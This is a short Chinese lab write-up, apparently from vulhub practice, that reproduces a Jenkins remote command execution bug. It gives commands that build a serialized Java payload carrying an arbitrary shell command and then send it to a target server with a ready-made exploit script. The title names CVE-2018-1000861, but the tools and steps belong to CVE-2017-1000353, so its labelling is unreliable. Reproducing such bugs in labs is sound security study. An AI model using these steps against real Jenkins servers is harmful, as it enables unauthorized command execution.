# Jenkins远程命令执行漏洞（CVE-2018-1000861）

###### by ADummy

### 0x00利用路线

​			反序列化生成ser文件--->现有poc直接发送

### 0x01漏洞介绍

​			

### 0x 02漏洞复现

### 步骤一、生成序列化字符串

参考https://github.com/vulhub/CVE-2017-1000353，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。

执行下面命令，生成字节码文件：

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser是生成的字节码文件名
# "touch ..."是待执行的任意命令
```

执行上述代码后，生成jenkins_poc.ser文件，这就是序列化字符串。

### 步骤二、发送数据包，执行命令

下载[exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py)，python3执行`python exploit.py http://your-ip:8080 jenkins_poc.ser`，将刚才生成的字节码文件发送给目标：

![Jenkins_CI_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Jenkins_CI_RCE_1.jpg)









